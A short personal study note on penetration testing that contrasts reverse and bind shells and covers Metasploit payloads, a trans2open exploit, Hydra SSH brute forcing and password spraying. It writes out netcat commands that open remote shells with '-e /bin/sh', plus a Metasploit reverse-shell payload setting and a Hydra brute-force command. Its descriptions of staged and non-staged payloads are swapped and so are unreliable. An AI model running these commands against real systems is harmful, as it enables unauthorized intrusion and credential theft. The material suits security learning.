
Reverse shell vs Bind Shell

###### Reverse shell - Target connect to us
  `netcat`
target is connecting and attack box is listening

	Attack box						Target machine			
nc -nlvp 4444 <-----reverse shell----- nc $ip 4444 -e /bin/sh

Attack box is listening and the connection is getting established from the target machine.

###### Bind Shell - we connect to the target

We will send a exploit and it spawns a listener from the target machine and attack box will makes a connection.

	 Attack box						Target machine			
nc $ip 4444 -------Bind Shell---------> nc -nvlp 4444 -e /bin/sh

bind shell will work in many ways for bypassing the firewalls

Staged and Non staged
###### Staged :
* Send exploits all at once.
* Larger in size, 
Eg: windows/meterpreter/reverse_tcp

###### Non staged
* Send payloads in stages.
* can be less stable 
Eg: windows/meterpreter_reverse_tcp

###### Gaining Root with metasploit
Checking for trans2open

If msfconsole was sending the stage means, the payload works and trying to open the session.
![[Pasted image 20230705062857.png]]

If you got session opened and closed in a same time. Try to change the staged payload to non staged payload.![[Pasted image 20230705063438.png]]

If it doesn't work change the payload options in metasploit by using this command.
`set payload linux/X86/shell_reverse_tcp`


###### Manual Exploitation :
Demo shown from Github: https://github.com/heltonWernik/OpenLuck

Syntax for using gcc compiler:
```bash
gcc -o *put_any_name* CompilingFile.c
```

put_any_name - after compiling the raw file we will get the executable file, which is good to be run.

##### Brute Forcing:
`hydra -l loginname -P /usr/share/wordlists/somepasswordlist.txt ssh://192.168.21.24 -t 4 -V`

##### Credential Stuffing and Password Spraying

Using burpsuite intruder method spraying the password

[Note:] #ActiveDirectory accounts may get locks without even trying the wrong password attempts. So before starting an attack you have to ask the company about invalid attempts for brute force login.
